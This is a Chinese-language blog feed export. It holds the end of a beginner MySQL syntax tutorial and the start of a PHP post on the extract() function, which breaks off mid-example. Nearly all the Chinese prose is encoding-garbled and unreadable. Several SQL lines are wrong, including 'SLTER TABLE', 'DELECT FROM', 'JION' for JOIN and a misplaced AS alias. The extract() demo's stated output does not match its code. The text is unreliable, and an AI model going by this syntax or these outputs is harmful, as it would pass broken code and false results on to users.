åœ¨è¡¨çš„æœ€åï¼Œä¹Ÿå¯ä½¿ç”¨FIRSTæˆ–AFTER[å­—æ®µå]</p></blockquote><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-08_15-58-44.png"></p><h5 id="ä¿®æ”¹å­—æ®µ"><a href="#ä¿®æ”¹å­—æ®µ" class="headerlink" title="ä¿®æ”¹å­—æ®µ"></a>ä¿®æ”¹å­—æ®µ</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ALTER TABLE [table_name] MODIFY [column_name] [æ”¹åæ•°æ®ç±»å‹] [æ”¹åçš„å®Œæ•´æ€§çº¦æŸ]ï¼›<br>SLTER TABLE [table_name] CHANGE [column_name] [new_column_name] [æ”¹åæ•°æ®ç±»å‹] [æ”¹åçš„å®Œæ•´æ€§çº¦æŸ]ï¼›<br></code></pre></td></tr></table></figure><blockquote><p>MODIFYå…³é”®å­—åªèƒ½æ”¹æ•°æ®ç±»å‹å’Œå®Œæ•´æ€§çº¦æŸ</p></blockquote><h5 id="åˆ é™¤å­—æ®µ"><a href="#åˆ é™¤å­—æ®µ" class="headerlink" title="åˆ é™¤å­—æ®µ"></a>åˆ é™¤å­—æ®µ</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ALTER TABLE [table_name] DROP [column_name];<br>ALTER TABLE [table_name] DROP [column_name1]ï¼ŒDROP [column_name2]ï¼ŒÂ·Â·Â·Â·Â·Â·ï¼›<br></code></pre></td></tr></table></figure><h3 id="å¯¹å†…å®¹çš„æ“ä½œ"><a href="#å¯¹å†…å®¹çš„æ“ä½œ" class="headerlink" title="å¯¹å†…å®¹çš„æ“ä½œ"></a>å¯¹å†…å®¹çš„æ“ä½œ</h3><h5 id="æ·»åŠ å†…å®¹"><a href="#æ·»åŠ å†…å®¹" class="headerlink" title="æ·»åŠ å†…å®¹"></a>æ·»åŠ å†…å®¹</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">INSERT INTO [table_name](&#x27;[column_name1]&#x27;ï¼Œ&#x27;[column_name2]&#x27;ï¼ŒÂ·Â·Â·Â·Â·Â·) VALUES (&#x27;[value1]&#x27;ï¼Œ&#x27;[value2]&#x27;,Â·Â·Â·Â·Â·Â·)ï¼›<br><br>INSERT INTO [table_name](&#x27;[column_name1]&#x27;ï¼Œ&#x27;[column_name2]&#x27;ï¼ŒÂ·Â·Â·Â·Â·Â·) VALUES (&#x27;[value1]&#x27;ï¼Œ&#x27;[value2]&#x27;,Â·Â·Â·Â·Â·Â·)ï¼Œ(&#x27;[value1]&#x27;ï¼Œ&#x27;[value2]&#x27;,Â·Â·Â·Â·Â·Â·)ï¼ŒÂ·Â·Â·Â·Â·Â·ï¼›<br>//ä¸€æ¬¡æ’å…¥å¤šæ¡æ•°æ®<br><br>INSERT INTO [table_name] VALUES (&#x27;[value1]&#x27;ï¼Œ&#x27;[value2]&#x27;,Â·Â·Â·Â·Â·Â·)ï¼›<br></code></pre></td></tr></table></figure><blockquote><p>ç¬¬äºŒç§æ–¹æ³•å¿…é¡»ä¸¥æ ¼æŒ‰ç…§è¡¨ä¸­é¡ºåºä¸€ä¸€å¡«å†™ï¼Œè‡ªå¢å­—æ®µå¯ç”¨nullå ä½ä½†ä¸èƒ½ä¸ºç©º</p></blockquote><p>æˆ‘çš„ç”µè„‘è¾“å…¥å­—æ®µåä¸èƒ½åŠ å¼•å·ä¸ç„¶ä¼šæŠ¥é”™<del>å°±ç¦»è°±</del></p><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-08_20-18-09.png"></p><h5 id="æŸ¥è¯¢å†…å®¹"><a href="#æŸ¥è¯¢å†…å®¹" class="headerlink" title="æŸ¥è¯¢å†…å®¹"></a>æŸ¥è¯¢å†…å®¹</h5><ul><li>é€‰æ‹©æŸä¸€è¡Œæˆ–æŸä¸€åˆ—</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [column_name],[column_name] FROM [table_name];<br></code></pre></td></tr></table></figure><ul><li>é€‰æ‹©æ•´ä¸ªè¡¨æ ¼</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT * FROM [table_name];<br></code></pre></td></tr></table></figure><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-08_20-19-13.png"></p><h5 id="åˆ é™¤å­—æ®µ-1"><a href="#åˆ é™¤å­—æ®µ-1" class="headerlink" title="åˆ é™¤å­—æ®µ"></a>åˆ é™¤å­—æ®µ</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">DELECT FROM [table_name] [åˆ é™¤æ¡ä»¶]; <br></code></pre></td></tr></table></figure><blockquote><p>åˆ é™¤å¯ä½¿ç”¨whereæ¡ä»¶ã€‚æ¡ä»¶å¯ç©ºï¼Œä¸ºç©ºæ—¶å…¨éƒ¨å€¼è¢«å½±å“ã€‚</p></blockquote><h5 id="ä¿®æ”¹å†…å®¹"><a href="#ä¿®æ”¹å†…å®¹" class="headerlink" title="ä¿®æ”¹å†…å®¹"></a>ä¿®æ”¹å†…å®¹</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">UPDATE [table_name] SET [column_name]=[value] [ä¿®æ”¹æ¡ä»¶];<br></code></pre></td></tr></table></figure><blockquote><p>ä¿®æ”¹æ¡ä»¶å¯ç©ºï¼Œå…¨éƒ¨å€¼è¢«å½±å“ã€‚</p></blockquote><h2 id="æŸ¥è¯¢è¯­å¥"><a href="#æŸ¥è¯¢è¯­å¥" class="headerlink" title="æŸ¥è¯¢è¯­å¥"></a>æŸ¥è¯¢è¯­å¥</h2><h4 id="distinct"><a href="#distinct" class="headerlink" title="distinct"></a>distinct</h4><p>å»é™¤é‡å¤å€¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT DISTINCT [column_name] FROM [table_name];<br></code></pre></td></tr></table></figure><h4 id="where"><a href="#where" class="headerlink" title="where"></a>where</h4><p>whereè¯­å¥ç”¨äºåœ¨è¡¨ä¸­é€‰æ‹©æŒ‡å®šç¬¦åˆæ¡ä»¶çš„æ•°æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [colum_name] FROM [table_name] WHERE æ¡ä»¶ï¼ˆå­—æ®µå+è¿ç®—ç¬¦+æ•°å€¼ï¼‰;<br></code></pre></td></tr></table></figure><h5 id="è¿ç®—ç¬¦"><a href="#è¿ç®—ç¬¦" class="headerlink" title="è¿ç®—ç¬¦"></a>è¿ç®—ç¬¦</h5><table><thead><tr><th>è¿ç®—ç¬¦</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>+</td><td>åŠ </td></tr><tr><td>-</td><td>å‡</td></tr><tr><td>*</td><td>ä¹˜</td></tr><tr><td>&#x2F;æˆ–DIV</td><td>é™¤</td></tr><tr><td>%æˆ–MOD</td><td>å–ä½™</td></tr></tbody></table><h5 id="æ¯”è¾ƒè¿ç®—ç¬¦"><a href="#æ¯”è¾ƒè¿ç®—ç¬¦" class="headerlink" title="æ¯”è¾ƒè¿ç®—ç¬¦"></a>æ¯”è¾ƒè¿ç®—ç¬¦</h5><table><thead><tr><th>è¿ç®—ç¬¦</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>&#x3D;</td><td>ç­‰äº</td></tr><tr><td>&lt;&gt;æˆ–ï¼&#x3D;</td><td>ä¸ç­‰äº</td></tr><tr><td>&gt;</td><td>å¤§äº</td></tr><tr><td>&lt;</td><td>å°äº</td></tr><tr><td>&gt;&#x3D;</td><td>å¤§äºç­‰äº</td></tr><tr><td>&lt;&#x3D;</td><td>å°äºç­‰äº</td></tr><tr><td>&#x3D;</td><td>ç­‰äº</td></tr><tr><td>between</td><td>åœ¨æŸä¸ªèŒƒå›´å†…</td></tr><tr><td>like</td><td>æ¨¡ç³ŠåŒ¹é…</td></tr></tbody></table><blockquote><p>å¯ä»¥ä½¿ç”¨andæˆ–orè¿æ¥å¤šä¸ªæ¡ä»¶</p></blockquote><p> <strong>likeç¬¦å·ä¸¾ä¾‹</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">like &#x27;[æŸ¥è¯¢å†…å®¹]%&#x27;      //è¡¨ç¤ºä»¥[æŸ¥è¯¢å†…å®¹]å¼€å¤´çš„æ•°æ®<br>like &#x27;%[æŸ¥è¯¢å†…å®¹]&#x27;      //è¡¨ç¤ºä»¥[æŸ¥è¯¢å†…å®¹]ç»“å°¾çš„æ•°æ®<br>like &#x27;%[æŸ¥è¯¢å†…å®¹]%&#x27;      //è¡¨ç¤ºåªè¦æŸ¥è¯¢å†…å®¹å‡ºç°å³å¯<br>like &#x27;_[æŸ¥è¯¢å†…å®¹]%&#x27;      //è¡¨ç¤ºæŸ¥è¯¢å†…å®¹å‰æœ‰ä¸€ä½å­—ç¬¦ï¼Œåæœ‰ä»»æ„å­—ç¬¦<br>like &#x27;%[æŸ¥è¯¢å†…å®¹]_&#x27;      //è¡¨ç¤ºæŸ¥è¯¢å†…å®¹å‰æœ‰ä»»æ„å­—ç¬¦ï¼Œåæœ‰ä¸€ä½å­—ç¬¦<br></code></pre></td></tr></table></figure><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-08_20-52-05.png"></p><p> <strong>betweenç”¨æ³•</strong></p><p> betweenè¿ç®—ç¬¦åŒ…æ‹¬èµ·å§‹å€¼å’Œç»“æŸå€¼</p><p> ç”¨äºé€‰å–ä¸¤ä¸ªæ•°å€¼èŒƒå›´ä¹‹å†…çš„å€¼ï¼Œå¯ä»¥æ˜¯å­—ç¬¦ä¸²ï¼Œæ•°å­—æˆ–è€…æ—¥æœŸ</p><p> eg:</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [colum_name] FROM [table_name] where [colum_name] BETWEEN [value1] and [value2];<br><br>SELECT [colum_name] FROM [table_name] where [colum_name] &gt;= [value1] and [colum_name] &lt;= [value2];<br></code></pre></td></tr></table></figure><h5 id="é€»è¾‘è¿ç®—ç¬¦"><a href="#é€»è¾‘è¿ç®—ç¬¦" class="headerlink" title="é€»è¾‘è¿ç®—ç¬¦"></a>é€»è¾‘è¿ç®—ç¬¦</h5><table><thead><tr><th>ç¬¦å·</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>NOTæˆ–ï¼</td><td>é€»è¾‘é</td></tr><tr><td>AND</td><td>é€»è¾‘ä¸</td></tr><tr><td>OR</td><td>é€»è¾‘æˆ–</td></tr><tr><td>XOR</td><td>é€»è¾‘å¼‚æˆ–</td></tr></tbody></table><h5 id="ä½è¿ç®—ç¬¦"><a href="#ä½è¿ç®—ç¬¦" class="headerlink" title="ä½è¿ç®—ç¬¦"></a>ä½è¿ç®—ç¬¦</h5><table><thead><tr><th>ç¬¦å·</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>&amp;</td><td>æŒ‰ä½ä¸</td></tr><tr><td>|</td><td>æŒ‰ä½æˆ–</td></tr><tr><td>^</td><td>æŒ‰ä½å¼‚æˆ–</td></tr><tr><td>!</td><td>å–å</td></tr><tr><td>&lt;&lt;</td><td>å·¦ç§»</td></tr><tr><td>&gt;&gt;</td><td>å³ç§»</td></tr></tbody></table><h5 id="in"><a href="#in" class="headerlink" title="in"></a>in</h5><p>inå®é™…ä¸Šæ˜¯å¤šä¸ªorçš„åˆå¹¶</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [colum_name] FROM [table_name] WHERE<br>[colum_name] IN([value1],[value2],Â·Â·Â·);<br></code></pre></td></tr></table></figure><p>eg:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [colum_name] FROM [table_name] WHERE<br>[colum_name] IN([value1],[value2],Â·Â·Â·);<br><br>SELECT [colum_name] FROM [table_name] WHERE<br>[colum_name]=[value1] or [colum_name]=[value2];<br></code></pre></td></tr></table></figure><h5 id="subquery"><a href="#subquery" class="headerlink" title="subquery"></a>subquery</h5><p>subqueryä¸ºå­æŸ¥è¯¢ï¼Œç”¨äºåµŒå¥—åœ¨whereå­å¥ä¸­çš„æŸ¥è¯¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [column_name],[column_name],Â·Â·Â·FROM [table_name] WHEREæ¡ä»¶ (å­æŸ¥è¯¢)<br></code></pre></td></tr></table></figure><blockquote><p>å­æŸ¥è¯¢ä¸ºä¸€ä¸ªå®Œæ•´çš„selectè¯­å¥</p></blockquote><h5 id="as"><a href="#as" class="headerlink" title="as"></a>as</h5><p>ç”¨asä¸ºæŸ¥æ‰¾å¯¹è±¡èµ·åˆ«åï¼Œä½†æˆ‘æ²¡å°è¯•æˆåŠŸğŸ¥²</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [å­—æ®µå] FROM [table_name] [æ¡ä»¶è¯­å¥] as [åˆ«å]; <br></code></pre></td></tr></table></figure><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-08_21-10-56.png"></p><h3 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h3><h5 id="countå‡½æ•°"><a href="#countå‡½æ•°" class="headerlink" title="countå‡½æ•°"></a>countå‡½æ•°</h5><p>countå‡½æ•°ç»Ÿè®¡ç¬¦åˆæ¡ä»¶çš„è®°å½•æ•°</p><p>ç»Ÿè®¡è¡¨ä¸­çš„è®°å½•<strong>æ€»æ•°</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT COUNT(*) FROM [table_name];<br></code></pre></td></tr></table></figure><p>ç»Ÿè®¡è¡¨ä¸­æŒ‡å®šå­—æ®µ<strong>ä¸ä¸ºNULL</strong>çš„æ•°æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT COUNT([column_name]) FROM [table_name];<br></code></pre></td></tr></table></figure><p>ç»Ÿè®¡è¡¨ä¸­æŒ‡å®šå­—æ®µ<strong>ä¸ºNULL</strong>çš„æ•°æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT *FROM [table_name] WHERE [column_name] IS NULL;<br></code></pre></td></tr></table></figure><h5 id="maxå‡½æ•°"><a href="#maxå‡½æ•°" class="headerlink" title="maxå‡½æ•°"></a>maxå‡½æ•°</h5><p>maxå‡½æ•°è¿”å›æ‰€é€‰å­—æ®µæœ€å¤§å€¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT MAX([column_name]) FROM [table_name];<br></code></pre></td></tr></table></figure><h5 id="minå‡½æ•°"><a href="#minå‡½æ•°" class="headerlink" title="minå‡½æ•°"></a>minå‡½æ•°</h5><p>minå‡½æ•°è¿”å›æ‰€é€‰å­—æ®µæœ€å°å€¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT MIN([column_name]) FROM [table_name];<br></code></pre></td></tr></table></figure><h5 id="avgå‡½æ•°"><a href="#avgå‡½æ•°" class="headerlink" title="avgå‡½æ•°"></a>avgå‡½æ•°</h5><p>avgå‡½æ•°è¿”å›æ‰€é€‰å­—æ®µçš„å¹³å‡å€¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT AVG([column_name]) FROM [table_name];<br></code></pre></td></tr></table></figure><h5 id="sumå‡½æ•°"><a href="#sumå‡½æ•°" class="headerlink" title="sumå‡½æ•°"></a>sumå‡½æ•°</h5><p>sumå‡½æ•°è¿”å›æ‰€é€‰æŒ‰å­—æ®µçš„åˆè®¡å€¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT SUM([column_name]) FROM [table_name];<br></code></pre></td></tr></table></figure><h3 id="å…¶ä»–ä¸€äº›æ¡ä»¶"><a href="#å…¶ä»–ä¸€äº›æ¡ä»¶" class="headerlink" title="å…¶ä»–ä¸€äº›æ¡ä»¶"></a>å…¶ä»–ä¸€äº›æ¡ä»¶</h3><h5 id="havingè¿‡æ»¤åˆ†ç»„"><a href="#havingè¿‡æ»¤åˆ†ç»„" class="headerlink" title="havingè¿‡æ»¤åˆ†ç»„"></a>havingè¿‡æ»¤åˆ†ç»„</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">- having ç»Ÿè®¡å‡½æ•° è¿ç®—ç¬¦ valueï¼›<br></code></pre></td></tr></table></figure><h5 id="group-byåˆ†ç»„"><a href="#group-byåˆ†ç»„" class="headerlink" title="group byåˆ†ç»„"></a>group byåˆ†ç»„</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">- GROUP BY [column_name];<br></code></pre></td></tr></table></figure><h5 id="æ’åº"><a href="#æ’åº" class="headerlink" title="æ’åº"></a>æ’åº</h5><p>å¯åˆ†ä¸ºæ­£åºascå’Œå€’åºdescä¸¤ç§æ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">- ORDER BY [column_name] [æ’åºæ–¹æ³•],[column_name] [æ’åºæ–¹æ³•],Â·Â·Â·Â·Â·Â·;   <br></code></pre></td></tr></table></figure><h5 id="é™åˆ¶æŸ¥è¯¢æ•°é‡"><a href="#é™åˆ¶æŸ¥è¯¢æ•°é‡" class="headerlink" title="é™åˆ¶æŸ¥è¯¢æ•°é‡"></a>é™åˆ¶æŸ¥è¯¢æ•°é‡</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">- LIMIT [æŸ¥è¯¢æ•°é‡]<br></code></pre></td></tr></table></figure><h4 id="å¤šè¡¨è”åˆ"><a href="#å¤šè¡¨è”åˆ" class="headerlink" title="å¤šè¡¨è”åˆ"></a>å¤šè¡¨è”åˆ</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [table_name1].[column_name1],[table_name2].[column_name2] FROM [table_name1],[table_name2] + WHEREå­å¥<br></code></pre></td></tr></table></figure><h5 id="jionè¿æ¥"><a href="#jionè¿æ¥" class="headerlink" title="jionè¿æ¥"></a>jionè¿æ¥</h5><p>jionè¿æ¥æ˜¯åŸºäºå¤šä¸ªè¡¨ä¹‹é—´çš„å…±åŒå­—æ®µæŠŠä»–ä»¬ç»“åˆèµ·æ¥è¿›è¡ŒæŸ¥è¯¢çš„ä¸€ç§æ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [column_name] AS FROM [table_name1] JION [table_name2] + ON å­å¥;<br></code></pre></td></tr></table></figure><h5 id="å†…è¿æ¥"><a href="#å†…è¿æ¥" class="headerlink" title="å†…è¿æ¥"></a>å†…è¿æ¥</h5><p>åˆ—å‡ºä¸¤ä¸ªè¡¨ä¸­éƒ½å­˜åœ¨çš„æ•°æ®<code>jion</code></p><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/jion.png"></p><h5 id="å·¦è¿æ¥"><a href="#å·¦è¿æ¥" class="headerlink" title="å·¦è¿æ¥"></a>å·¦è¿æ¥</h5><p>å³ä½¿æ²¡æœ‰åŒ¹é…ä¹Ÿè¦åˆ—å‡ºå·¦è¡¨çš„æ•°æ®<code>left jion</code></p><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/leftjion.png"></p><h5 id="å³è¿æ¥"><a href="#å³è¿æ¥" class="headerlink" title="å³è¿æ¥"></a>å³è¿æ¥</h5><p>å³ä½¿æ²¡æœ‰åŒ¹é…ä¹Ÿè¦åˆ—å‡ºå³è¡¨çš„æ•°æ®<code>right jion</code></p><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/rightjion.png"></p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>SQLè¯­å¥æ ¼å¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">[SELECTè¯­å¥] [WHEREæ¡ä»¶] [GROUP BYæ¡ä»¶] [HAVINGæ¡ä»¶] [ORDER BYæ¡ä»¶] [LIMITæ¡ä»¶]ï¼›<br></code></pre></td></tr></table></figure><hr><p>ç»ˆäºæŠŠè¿™SQLè¯­å¥æå®Œäº†</p><p>æ’’èŠ±ğŸ‰</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>MySQL</tag>
      
      <tag>phpstudy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHPé»‘é­”æ³•</title>
    <link href="/2023/03/01/PHP%E9%BB%91%E9%AD%94%E6%B3%95/"/>
    <url>/2023/03/01/PHP%E9%BB%91%E9%AD%94%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>å¤å¨œæ‹‰é»‘æš—ä¹‹ç¥ğŸª„</p><span id="more"></span><h2 id="PHPåŸºç¡€å‡½æ•°"><a href="#PHPåŸºç¡€å‡½æ•°" class="headerlink" title="PHPåŸºç¡€å‡½æ•°"></a>PHPåŸºç¡€å‡½æ•°</h2><p>æ¥ç€ä¸Šä¸€ç¯‡å°bugï¼ŒæŠŠé‚£äº›ä¹Ÿææºœè¿‡æ¥ç»§ç»­å†™ğŸ§</p><h3 id="extract"><a href="#extract" class="headerlink" title="extract()"></a>extract()</h3><p>extract() å‡½æ•°ä»<strong>æ•°ç»„</strong>ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ã€‚è¯¥å‡½æ•°ä½¿ç”¨æ•°ç»„<strong>é”®å</strong>ä½œä¸ºå˜é‡åï¼Œä½¿ç”¨æ•°ç»„<strong>é”®å€¼</strong>ä½œä¸ºå˜é‡å€¼ã€‚</p><h4 id="è¯­æ³•"><a href="#è¯­æ³•" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h4><p><code>extract(array,extract_rules,prefix)</code></p><table><thead><tr><th>å‚æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td>arrayï¼ˆæ•°ç»„åï¼‰</td><td>è§„å®šè¦ä½¿ç”¨çš„æ•°ç»„</td></tr><tr><td>extract_rulesï¼ˆæå–è§„åˆ™ï¼‰</td><td>å¯çœç•¥ã€‚<em>extract()</em> å‡½æ•°å°†æ£€æŸ¥æ¯ä¸ªé”®åæ˜¯å¦ä¸ºåˆæ³•çš„å˜é‡åï¼ŒåŒæ—¶ä¹Ÿæ£€æŸ¥å’Œç¬¦å·è¡¨ä¸­å·²å­˜åœ¨çš„å˜é‡åæ˜¯å¦å†²çªã€‚å¯¹ä¸åˆæ³•å’Œå†²çªçš„é”®åçš„å¤„ç†å°†æ ¹æ®æ­¤å‚æ•°å†³å®šã€‚</td></tr><tr><td>prefixï¼ˆå‰ç¼€ï¼‰</td><td>å¯çœç•¥ã€‚è¯·æ³¨æ„ <em>prefix</em> ä»…åœ¨ <em>extract_type</em> çš„å€¼æ˜¯ EXTR_PREFIX_SAMEï¼ŒEXTR_PREFIX_ALLï¼ŒEXTR_PREFIX_INVALID æˆ– EXTR_PREFIX_IF_EXISTS æ—¶éœ€è¦ã€‚å¦‚æœé™„åŠ äº†å‰ç¼€åçš„ç»“æœä¸æ˜¯åˆæ³•çš„å˜é‡åï¼Œå°†ä¸ä¼šå¯¼å…¥åˆ°ç¬¦å·è¡¨ä¸­ã€‚</td></tr></tbody></table><p><strong><em>extract_rules</em>å¯èƒ½çš„å€¼ï¼š</strong></p><ul><li>EXTR_OVERWRITE - é»˜è®¤ã€‚å¦‚æœæœ‰å†²çªï¼Œåˆ™è¦†ç›–å·²æœ‰çš„å˜é‡</li><li>EXTR_SKIP - å¦‚æœæœ‰å†²çªï¼Œä¸è¦†ç›–å·²æœ‰çš„å˜é‡ã€‚</li><li>EXTR_PREFIX_SAME - å¦‚æœæœ‰å†²çªï¼Œåœ¨å˜é‡åå‰åŠ ä¸Šå‰ç¼€ <em>prefix</em>ã€‚</li><li>EXTR_PREFIX_ALL - ç»™æ‰€æœ‰å˜é‡ååŠ ä¸Šå‰ç¼€ <em>prefix</em>ã€‚</li><li>EXTR_PREFIX_INVALID - ä»…åœ¨ä¸åˆæ³•æˆ–æ•°å­—å˜é‡åå‰åŠ ä¸Šå‰ç¼€ <em>prefix</em>ã€‚</li><li>EXTR_IF_EXISTS - ä»…åœ¨å½“å‰ç¬¦å·è¡¨ä¸­å·²æœ‰åŒåå˜é‡æ—¶ï¼Œè¦†ç›–å®ƒä»¬çš„å€¼ã€‚å…¶å®ƒçš„éƒ½ä¸å¤„ç†ã€‚</li><li>EXTR_PREFIX_IF_EXISTS - ä»…åœ¨å½“å‰ç¬¦å·è¡¨ä¸­å·²æœ‰åŒåå˜é‡æ—¶ï¼Œå»ºç«‹é™„åŠ äº†å‰ç¼€çš„å˜é‡åï¼Œå…¶å®ƒçš„éƒ½ä¸å¤„ç†ã€‚</li><li>EXTR_REFS - å°†å˜é‡ä½œä¸ºå¼•ç”¨æå–ã€‚å¯¼å…¥çš„å˜é‡ä»ç„¶å¼•ç”¨äº†æ•°ç»„å‚æ•°çš„å€¼ã€‚</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#å®ä¾‹æ¼”ç¤º1</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;Apple&quot;</span>;<br><span class="hljs-variable">$my_array</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;a&quot;</span> =&gt; <span class="hljs-string">&quot;cat&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>=&gt; <span class="hljs-string">&quot;dog&quot;</span>,<span class="hljs-string">&quot;d&quot;</span> =&gt;<span class="hljs-string">&quot;horse&quot;</span>);<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$my_array</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$a</span> = <span class="hljs-subst">$a</span>;<span class="hljs-subst">$b</span> = <span class="hljs-subst">$b</span>;<span class="hljs-subst">$c</span> = <span class="hljs-subst">$c</span>&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure> <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">#è¾“å‡ºæ¼”ç¤º<br>$a = cat;$b = dog;$c = horse<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#å®ä¾‹æ¼”ç¤º2</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;Apple&quot;</span>;<br><span class="hljs-variable">$my_array</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;a&quot;</span> =&gt; <span 